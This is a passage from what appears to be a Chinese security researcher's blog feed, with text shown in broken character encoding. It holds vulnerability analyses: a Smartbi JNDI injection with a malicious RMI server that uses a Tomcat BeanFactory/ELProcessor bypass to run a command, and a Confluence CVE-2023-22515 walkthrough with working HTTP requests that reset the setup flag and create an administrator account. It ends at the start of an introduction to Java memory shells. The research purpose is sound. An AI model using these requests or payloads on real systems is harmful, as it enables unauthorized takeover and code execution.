æ–¹æ³•</li><li>è°ƒç”¨çš„æ–¹æ³•å¿…é¡»æ˜¯publicæ–¹æ³•</li><li>è°ƒç”¨çš„æ–¹æ³•åªæœ‰ä¸€ä¸ªå‚æ•°å¹¶ä¸”å‚æ•°ç±»å‹ä¸ºStringç±»å‹</li></ul><p>æ‰€ä»¥ä¸‹é¢æˆ‘ä»¬åªè¦æ‰¾åˆ°æŸä¸ªç±»çš„æŸä¸ªæ–¹æ³•æ—¢æ»¡è¶³äº†ä¸Šé¢çš„æ¡ä»¶åˆå®ç°æˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½ã€‚</p><ul><li><code>javax.el.ELProcessor#eval</code>æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯<code>ELProcessor</code>æ˜¯åœ¨Tomcat8æ‰å¼•å…¥çš„ã€‚</li><li><code>groovy.lang.GroovyShell#evaluate(java.lang.String)</code>é€šè¿‡Groovyæ‰§è¡Œå‘½ä»¤ã€‚</li><li><code>com.thoughtworks.xstream.XStream().fromXML(String)</code>é€šè¿‡è°ƒç”¨<code>XStream</code>è½¬æ¢XMLæ—¶çš„ååºåˆ—åŒ–æ¼æ´å¯¼è‡´çš„RCEï¼Œè¿™é‡Œä¹‹æ‰€ä»¥é€‰æ‹©<code>XStream</code>æ˜¯å› ä¸ºXstreamçš„ååºåˆ—åŒ–æ¼æ´å’Œå½±å“ç‰ˆæœ¬æ¯”è¾ƒå¤šã€‚JSONçš„è½¬æ¢çš„æ¼æ´ç›¸å¯¹æ¥è¯´é€šç”¨æ€§ä¸é«˜ã€‚</li><li><code>org.yaml.snakeyaml.Yaml#load(java.lang.String)</code>åŠ è½½Yamlæ—¶çš„ååºåˆ—åŒ–æ¼æ´ï¼Œåœ¨SpringBootä¸­ç»å¸¸ä¼šä½¿ç”¨<code>snakeyaml</code>æ¥è¿›è¡Œymlé…ç½®æ–‡ä»¶çš„è§£æã€‚</li><li><code>org.mvel2.MVEL#eval(String)</code>æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œ<code>æµ…è“</code>å¸ˆå‚…æ–‡ç« ä¸­æåˆ°çš„æ˜¯<code>MVEL</code>ç±»æ˜¯privateæ‰€ä»¥è¦æ‰¾ä¸Šå±‚è°ƒç”¨ï¼Œæˆ‘åœ¨<code>2.0.17</code>ä¸­æµ‹è¯•<code>Mvel</code>æ˜¯å­˜åœ¨publicæ— å‚æ„é€ æ–¹æ³•çš„ï¼Œé«˜ç‰ˆæœ¬ç¡®å®æ¢æˆäº†privateæ„é€ æ–¹æ³•ã€‚æ‰€ä»¥åªèƒ½æ‰¾é‚£é‡Œè°ƒç”¨äº†<code>Mvel#eval</code>æ–¹æ³•ï¼Œè€Œ<code>org.mvel2.sh.ShellSession#exec</code>è°ƒç”¨äº†<code>Mvel#eval</code>ï¼Œå› æ­¤å¯ä»¥é€šè¿‡<code>ShellSession#exec</code>æ¥é—´æ¥å®Œæˆè°ƒç”¨ã€‚</li><li><code>com.sun.glass.utils.NativeLibLoader#loadLibrary(String)</code>åŠ è½½DLLï¼Œå‰ææ˜¯æˆ‘ä»¬å·²ç»å°†æ„é€ å¥½çš„DLLä¸Šä¼ è‡³ç›®æ ‡ä¸Šï¼Œæ‰€ä»¥å±€é™æ€§æ¯”è¾ƒå¤§ã€‚</li></ul><h3 id="æœåŠ¡ç«¯ä»£ç ï¼š"><a href="#æœåŠ¡ç«¯ä»£ç ï¼š" class="headerlink" title="æœåŠ¡ç«¯ä»£ç ï¼š"></a>æœåŠ¡ç«¯ä»£ç ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIServerbypass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;<br>        System.out.println(<span class="hljs-string">&quot;Creating evil RMI registry on port 1097&quot;</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1097</span>);<br><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br><br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);<br>        registry.bind(<span class="hljs-string">&quot;Object&quot;</span>, referenceWrapper);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°ï¼š"><a href="#æ¼æ´å¤ç°ï¼š" class="headerlink" title="æ¼æ´å¤ç°ï¼š"></a>æ¼æ´å¤ç°ï¼š</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi//version/.stub?className=DataSourceService&amp;methodName=testConnection&amp;params=%5B%7B%22driverType%22%3A%22aaa%22%2C%22driver%22%3A%22com.ibm.db2.jcc.DB2Driver%22%2C%22maxConnection%22%3A1%2C%22transactionIsolation%22%3A1%2C%22validationQueryMethod%22%3A3%2C%22url%22%3A%22JNDI%3Armi%3A%2F%2F10.65.14.146%3A1097%2FObject%22%7D%5D</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.181.67:18080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4<br><br><span class="language-ebnf"><span class="hljs-attribute">Yuanyi</span></span><br></code></pre></td></tr></table></figure><p><img src="https://i.miji.bid/2023/11/28/ee4de4eff44e737801fd4f753e34f824.png" alt="image-20231128160927981"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´åˆ†æ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Confluence å±æ€§è¦†ç›–å¯¼è‡´æƒé™ç»•è¿‡æ¼æ´ (CVE-2023-22515)</title>
    <link href="/2023/11/09/CVE-2023-22515/"/>
    <url>/2023/11/09/CVE-2023-22515/</url>
    
    <content type="html"><![CDATA[<h1 id="Confluence-å±æ€§è¦†ç›–CVE-2023-22515"><a href="#Confluence-å±æ€§è¦†ç›–CVE-2023-22515" class="headerlink" title="Confluence å±æ€§è¦†ç›–CVE-2023-22515"></a>Confluence å±æ€§è¦†ç›–CVE-2023-22515</h1><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p>Confluence æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„ Java åº”ç”¨ç¨‹åºï¼ŒåŸºäº Apache Struts æ¡†æ¶æ„å»ºã€‚ä½œä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ï¼ŒXWork2 ä½¿ç”¨äº†è¯¥æ¡†æ¶ã€‚<strong>XWork æ¡†æ¶å…è®¸é€šè¿‡ HTTP è¯·æ±‚ä¸­æä¾›çš„ HTTP å‚æ•°æ¥è®¾ç½® Java å¯¹è±¡çš„å‚æ•°</strong></p><p>ä¾‹å¦‚åœ¨ç¨‹åºä¸­ï¼Œè°ƒç”¨äº†æ–¹æ³•:<code>getFormData().setName(&quot;Charles&quot;)</code></p><p>é€šè¿‡XWorkè¿›è¡Œhttpå‘é€ï¼Œå°±æ˜¯:<code>formData.name=Charles</code></p><p>å¦‚æœ<code>getFormData()</code> è¿”å› nullï¼Œåˆ™ä½¿ç”¨é»˜è®¤æ„é€ å™¨ï¼Œå†ç”¨<code>setFormDat(Object object)</code> è¿›è¡Œè®¾ç½®</p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>å…ˆä»æ­£å¸¸åˆå§‹åŒ–åˆ›å»º<code>admin</code>æƒé™ç”¨æˆ·å…¥æ‰‹ï¼Œæ­£å¸¸åˆå§‹åŒ–<code>admin</code>æƒé™çš„ç”¨æˆ·æ•°æ®åŒ…å¦‚ä¸‹ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/setup/setupadministrator.action</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.146:8090<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>117<br><span class="hljs-attribute">X-Atlassian-Token</span><span class="hljs-punctuation">: </span>no-check<br><br><span class="language-dts"><span class="hljs-attr">username</span><span class="hljs-operator">=</span>nsfocus<span class="hljs-variable">&amp;</span>fullN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>nsfocus<span class="hljs-variable">&amp;email</span>=nsfocus%<span class="hljs-number">40</span>nsfocus.org<span class="hljs-variable">&amp;password</span>=nsfocus<span class="hljs-variable">&amp;confirm</span>=nsfocus<span class="hljs-variable">&amp;setup</span>-<span class="hljs-attr">next-button</span><span class="hljs-operator">=</span>Next</span><br></code></pre></td></tr></table></figure><p>å½“å°†æ­¤æ•°æ®åŒ…å‘é€ç»™æœåŠ¡ç«¯åï¼Œé¦–å…ˆä¼šæ¥åˆ°<code>SetupCheckInterceptor</code>æ‹¦æˆªå™¨ï¼Œè§¦å‘<code>intercept()</code>æ–¹æ³•ï¼š</p><p><img src="https://i.mji.rip/2023/11/09/0d5596e56119a4f9a9fc84ae2f3565c7.png" alt="image-20231109142612802"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯åšäº†åˆ¤æ–­ã€‚å¦‚æœä¸¤æ¡çº¢è‰²è¯­å¥<code>ä¸</code>çš„ç»“æœä¸ºTrueåˆ™è¿”å›<code>&quot;alreadysetup&quot;</code>å¦åˆ™è°ƒç”¨<code>actionInvocation.invoke()</code>ã€‚</p><p>é‚£æˆ‘ä»¬å…ˆæ¥å°†è¿™æ®µä»£ç æŒ‰é¢œè‰²åˆ†ä¸ºå‰åä¸¤éƒ¨åˆ†è§£é‡Šä¸€ä¸‹æ¯æ¡è¯­å¥çš„å«ä¹‰ï¼š</p><p>å‰åŠéƒ¨åˆ†ï¼š</p><p><code>BootstrapUtils.getBootstrapManager().isSetupComplete()</code> å’Œ<code>ContainerManager.isContainerSetup()</code> ç”¨äºæ£€æŸ¥ Confluence æ˜¯å¦è¿›è¡Œè®¾ç½®ï¼›</p><p><code>BootstrapUtils.getBootstrapManager()</code>è¿”å› <code>DefaultAtlassianBootstrapManager</code> å¯¹è±¡ï¼Œå†è°ƒç”¨<code>isSetupComplete()</code> æ–¹æ³•</p><p><img src="https://i.mji.rip/2023/11/09/c9952de49b1d1fd76f1bd05399b59ee0.png" alt="image-20231109143509686"></p><p>è¿™é‡Œä¼šè°ƒç”¨<code>applicationConfig.isSetupComplete()</code>è€Œ<code>isSetupComplete()</code>åˆä¼šå°†å…¨å±€å˜é‡<code>setupComplete</code>è¿”å›ï¼›æˆ‘ä»¬çœ‹åˆ°åœ¨ä¸‹é¢åˆæœ‰å˜é‡<code>setupComplete</code>çš„setæ–¹æ³•ã€‚</p><p><img src="https://i.mji.rip/2023/11/09/4d5c5e72aebc420c37d94154445140ee.md.png" alt="image-20231109153435574"></p><p>ä¹Ÿå°±æ˜¯è¯´åªè¦æˆ‘ä»¬è®©<code>SetupComplete</code>å‚æ•°ä¸ºFalseï¼Œé‚£ä¹ˆæ•´ä½“çš„åˆ¤æ–­éƒ½ä¼šä¸ºfalseã€‚ï¼ˆè¿™ä¸ªå‚æ•°å¾ˆé‡è¦åç»­ä¼šæåˆ°ï¼‰</p><p>ååŠéƒ¨åˆ†ï¼š</p><p>è€Œ<code>actionInvocation.invoke()</code>ä¸­çš„<code>actionInvocation</code>æ˜¯<code>intercept()</code>ä¼ å…¥çš„<code>DefaultActionInvocation</code>æ‰€ä»¥ä¼šè°ƒç”¨å®ƒå½“ä¸­çš„invokeæ–¹æ³•ã€‚è€Œ<code>DefaultActionInvocation.invoke()</code>æ˜¯ä¸€ä¸ªå¤„ç†æ“ä½œæ‰§è¡Œæµç¨‹çš„æ§åˆ¶å™¨ï¼Œå®ƒé¦–å…ˆå¤„ç†æ‹¦æˆªå™¨ï¼Œå†æ‰§è¡Œå…·ä½“æ“ä½œï¼Œæœ€åæ‰§è¡Œé¢„ç»“æœç›‘å¬å™¨å’Œç»“æœã€‚è¿™é‡Œå°†è¾“å…¥çš„å†…å®¹äº¤ç»™<code>SafeParametersInterceptor</code>ã€‚</p><p><img src="https://i.mji.rip/2023/11/09/a6c66ddf0b40b4b58a4f9d4b067579ae.png" alt="image-20231109150849210"></p><p>æ­£å¸¸æµç¨‹<code>BootstrapUtils.getBootstrapManager().isSetupComplete()</code> ä¸<code>ContainerManager.isContainerSetup()</code>è‚¯å®šä¸ºFalseã€‚çœç•¥æ‰ä¸­é—´æ— ç”¨éƒ¨åˆ†ï¼Œæœ€åæ¥åˆ°éªŒè¯ç”¨æˆ·ï¼ˆè¿™é‡Œçš„éªŒè¯é€»è¾‘æ˜¯ä¸ç°æœ‰ç”¨æˆ·è¿›è¡ŒåŒ¹é…æ˜¯å¦é‡åï¼‰éªŒè¯æˆåŠŸåä¾¿å¯åˆ›å»ºã€‚</p><p><img src="https://i.mji.rip/2023/11/09/eede9e21c84b8832a6ad4889d9cbf748.png" alt="image-20231109144708304"></p><p>åˆ›å»º<code>admin</code>æƒé™çš„ç”¨æˆ·ï¼š</p><p><img src="https://i.mji.rip/2023/11/09/e9c473131694a0f8e10115cd644c649b.md.png" alt="image-20231109151539524"></p><p>ä»¥ä¸Šå°±æ˜¯æˆ‘ä»¬åœ¨åˆå§‹åŒ–æ—¶åˆ›å»ºç”¨æˆ·çš„æ­£å¸¸æµç¨‹ã€‚é‚£æ¼æ´åˆ°åº•æ—¶å¦‚ä½•äº§ç”Ÿçš„å‘¢ï¼Ÿè¿˜éœ€è¦å›å½’åˆ°æˆ‘ä»¬çš„ç¬¬ä¸€æ­¥ã€‚</p><p><img src="https://i.mji.rip/2023/11/09/0d5596e56119a4f9a9fc84ae2f3565c7.png" alt="image-20231109142612802"></p><p>åœ¨äº†è§£ä¸Šé¢çš„æ­£å¸¸æµç¨‹åï¼Œæˆ‘ä»¬å¯ä»¥è¿™ä¹ˆç®€å•è®¤ä¸ºã€‚åªè¦å‰åŠçº¢è‰²éƒ¨åˆ†æœ‰ä¸€ä¸ªä¸ºFalseï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œ<code>actionInvocation.invoke()</code>ä¹Ÿå°±æ˜¯ç›¸å½“äºåˆ›å»ºç”¨æˆ·ã€‚æ‰€ä»¥æˆ‘ä»¬çš„ä¸»è¦æ€è·¯è¿˜æ˜¯æ”¾åœ¨å¦‚ä½•è®©å‰åŠéƒ¨åˆ†çš„ä¸¤æ¡è¯­å¥ä»»ä¸€å˜ä¸ºFalseã€‚</p><p>å‰ç½®çŸ¥è¯†ä¸­æåˆ°äº†ï¼ŒXWorks å…è®¸ ä»¥HTTPçš„å½¢å¼è°ƒç”¨å¯¹è±¡çš„setter æ–¹æ³•ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬æ­¤æ—¶éœ€è¦å¯»æ‰¾ä¸€ä¸ªæ— éœ€æˆæƒã€Actionå¯¹è±¡è¿˜å…¬å¼€ä¸€ä¸ªåˆé€‚çš„getæ–¹æ³•ã€è¯¥æ–¹æ³•å…è®¸æˆ‘ä»¬è®¿é—®åº”ç”¨ç¨‹åºé…ç½®ã€‚</p><p>æˆ‘ä»¬æ‰¾åˆ°<code>ConfluenceActionSupport</code>ç±»ã€‚åœ¨<code>ConfluenceActionSupport</code>ä¸­çš„<code>getBootstrapStatusProvider</code>ä¸­è·å–äº†<code>BootstrapStatusProviderImpl</code>çš„å®ä¾‹å¯¹è±¡å¹¶è¿”å›ã€‚</p><p><img src="https://i.mji.rip/2023/11/09/14f099b658a9ecee162d085e47f3a012.md.png" alt="image-20231109162025299"></p><p>æˆ‘ä»¬å†è·Ÿåˆ°<code>BootstrapStatusProviderImpl</code>ï¼Œå‘ç°è¯¥å®ä¾‹å¯¹è±¡å­˜åœ¨<code>getApplicationConfig</code>æ–¹æ³•ï¼Œè€Œä¸”æœ‰å¯¹åº”è¿”å›å€¼ã€‚</p><p><img src="https://i.mji.rip/2023/11/09/cdb50b6bad2de13c4f65e2c070dccb07.png" alt="image-20231109162536006"></p><p>è€Œåœ¨<code>ApplicationConfig</code>çš„å®ä¾‹å¯¹è±¡ä¸­å­˜åœ¨<code>setSetupComplete</code>ï¼Œå½“ä¸­çš„å‚æ•°<code>SetupComplete</code>å°±æ˜¯æˆ‘ä»¬åœ¨å¼€å§‹çš„æ—¶å€™åˆ†æçš„å¯¹åˆå§‹åˆ¤æ–­èµ·å†³å®šæ€§ä½œç”¨çš„çš„å‚æ•°ã€‚</p><p><img src="https://i.mji.rip/2023/11/09/7d76b0e89525c6ea033bf074df389c72.png" alt="image-20231109163116672"></p><p>è¯¦ç»†çš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bootstrapStatusProvider</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">BootstrapStatusProviderImpl</span><br><span class="hljs-keyword"></span>ApplicationConfiguration<br>ApplicationConfig<br>setSetupComplete<br></code></pre></td></tr></table></figure><p>æ•…è½¬æ¢æˆHTTPæ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">bootstrapStatusProvider.applicationConfig.setupComplete=false<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><ol><li><p>å…ˆè¦†ç›–ç›®æ ‡ConfluenceæœåŠ¡å™¨ä¸­çš„<code>bootstrapStatusProvider.applicationConfig.setupComplete</code>å±æ€§ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.146:8090<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><br></code></pre></td></tr></table></figure><p><img src="https://i.mji.rip/2023/11/09/cf9d28314ca097c984a271fd5dec47ba.png" alt="image-20231109141047184"></p></li><li><p>ç„¶åæ–°å»ºç®¡ç†å‘˜è´¦æˆ·ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/setup/setupadministrator.action</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.146:8090<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>94<br><span class="hljs-attribute">X-Atlassian-Token</span><span class="hljs-punctuation">: </span>no-check<br><br><span class="language-dts"><span class="hljs-attr">username</span><span class="hljs-operator">=</span>nsfocus<span class="hljs-variable">&amp;</span>fullN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>nsfocus<span class="hljs-variable">&amp;email</span>=nsfocus%<span class="hljs-number">40</span>nsfocus.org<span class="hljs-variable">&amp;password</span>=nsfocus<span class="hljs-variable">&amp;confirm</span>=nsfocus<span class="hljs-variable">&amp;setup</span>-<span class="hljs-attr">next-button</span><span class="hljs-operator">=</span>Next</span><br></code></pre></td></tr></table></figure><p><img src="https://i.mji.rip/2023/11/09/f5c607d746a5d8c1bbb3cd9bee5e0a7e.png" alt="image-20231109141150966"></p></li><li><p>æŸ¥çœ‹ç”¨æˆ·ç›®å½•å‘ç°æ·»åŠ æˆåŠŸã€‚</p><p><img src="https://i.mji.rip/2023/11/09/ddf718d90dd504710abcd6949ec74e9a.md.png" alt="image-20231109141252166"></p></li><li><p>ç™»å½•ç›´æ¥ä¸ºadminæƒé™çš„ç”¨æˆ·ï¼š</p><p><img src="https://i.mji.rip/2023/11/09/a042312c54c2014224b934ae7a9be163.png" alt="image-20231109141527544"></p></li></ol><h3 id><a href="#" class="headerlink" title></a></h3><p>ä¸Šä¼ å¯¹æ¯”æµ‹è¯•ï¼ï¼</p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´åˆ†æ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åˆè¯†å†…å­˜é©¬</title>
    <link href="/2023/10/25/%E5%88%9D%E8%AF%86%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2023/10/25/%E5%88%9D%E8%AF%86%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="å­¦ä¹ å†…å­˜é©¬ä¹‹å‰ä½ å¿…é¡»çŸ¥é“çš„çŸ¥è¯†"><a href="#å­¦ä¹ å†…å­˜é©¬ä¹‹å‰ä½ å¿…é¡»çŸ¥é“çš„çŸ¥è¯†" class="headerlink" title="å­¦ä¹ å†…å­˜é©¬ä¹‹å‰ä½ å¿…é¡»çŸ¥é“çš„çŸ¥è¯†"></a>å­¦ä¹ å†…å­˜é©¬ä¹‹å‰ä½ å¿…é¡»çŸ¥é“çš„çŸ¥è¯†</h1><h2 id="JavaWebä¸‰å¤§ä»¶"><a href="#JavaWebä¸‰å¤§ä»¶" class="headerlink" title="JavaWebä¸‰å¤§ä»¶"></a>JavaWebä¸‰å¤§ä»¶</h2><p>å½“JavaWebæ¥æ”¶åˆ°è¯·æ±‚æ—¶ä¼šä¾æ¬¡ç»è¿‡ Listener  â€”&gt; Filter â€”&gt; Servlet</p><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>Java Web å¼€å‘ä¸­çš„ç›‘å¬å™¨ï¼ˆListenerï¼‰å°±æ˜¯ Applicationã€Session å’Œ Request ä¸‰å¤§å¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ã€‚</p><p>ServletContextListenerï¼šå¯¹Servletä¸Šä¸‹æ–‡çš„åˆ›å»ºå’Œé”€æ¯è¿› è¡Œç›‘å¬ï¼›ServletContextAttributeListenerï¼šç›‘å¬ Servlet ä¸Šä¸‹æ–‡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ï¼›</p><p>HttpSessionListenerï¼šå¯¹ Session çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚Session çš„é”€æ¯æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ä¸ªä¸­ Session è¶…æ—¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨ Session å¯¹è±¡çš„ invalidate() æ–¹æ³•ä½¿ session å¤±æ•ˆã€‚</p><p>HttpSessionAttributeListenerï¼šå¯¹ Session å¯¹è±¡ä¸­å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ï¼›</p><p>ServletRequestListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡çš„åˆå§‹åŒ–å’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼›ServletRequestAttributeListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡å±æ€§çš„æ·»åŠ ã€åˆ 